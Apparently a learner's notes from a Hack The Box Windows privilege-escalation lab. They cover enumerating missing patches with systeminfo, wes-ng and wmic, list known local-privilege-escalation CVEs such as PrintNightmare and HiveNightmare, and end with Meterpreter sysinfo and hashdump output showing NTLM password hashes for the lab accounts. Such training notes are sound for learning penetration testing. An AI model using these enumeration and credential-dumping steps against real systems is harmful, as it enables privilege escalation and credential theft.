Over the years, there have been many kernel exploits that affect the Windows operating system from Windows 2000/XP up to Windows 10/Server 2016/2019. 

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. T
## fast enumeration:
```
systeminfo > systeminfo
# or get-hotfix to see when last updated
```
copy via rdp clipboard

`check for exploits`
```
wes-ng  systeminfo
```
## Enumerating Missing Patches

`checking updates`
```powershell-session
PS C:\htb> wmic qfe list brief
# LOOK FOR INSTALLEDON DATE
PS C:\htb> Get-Hotfix
```
## quick wins / known CVEs

| CVE              | Nickname            | Disclosed       | Fixed / Patch Date   |
|------------------|---------------------|-----------------|----------------------|
| CVE-2019-1322    | Service → SYSTEM    | Nov 2019        | Nov 2019 Patch Tues  |
| CVE-2019-1405    | Service Token LPE   | Nov 2019        | Nov 2019 Patch Tues  |
| CVE-2020-1472    | Zerologon           | Aug 2020        | Aug 11, 2020         |
| CVE-2021-1675    | Print Spooler LPE   | Jun 8, 2021     | Jun 2021 CU          |
| CVE-2021-34527   | PrintNightmare      | Jun 29, 2021    | Jul 6, 2021 (KB5004945) + Sept 2021 hardening |
| CVE-2021-36934   | HiveNightmare       | Jul 20, 2021    | Aug 10, 2021 (ACL fix) — shadow copies need manual cleanup |
| CVE-2021-1732    | Win32k Elevation    | Feb 2021        | Feb 2021 Patch Tues  |
| CVE-2021-40450   | Win32k PrivEsc      | Oct 2021        | Oct 12, 2021         |
| CVE-2022-35761   | Kernel LPE          | Aug 2022        | Aug 2022 Patch Tues  |
| CVE-2024-20698   | Kernel Bypass       | Jan 2024        | Jan 2024 Patch Tues  |
| CVE-2024-21302   | VBS Rollback        | Feb 2024        | Feb 2024 Patch Tues  |
| CVE-2025-21293   | AD Reg Permissions  | Jan 2025        | Jan 14, 2025         |


#### WMI
![](Pasted%20image%2020250320211532.png)
we can then search for that KB in microsoft update catalog site 
https://www.catalog.update.microsoft.com/Search.aspx
- A search for `KB5000808` shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.


meterpreter > sysinfo

Computer        : WINLPE-WS02
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 6
Meterpreter     : x64/windows


meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
```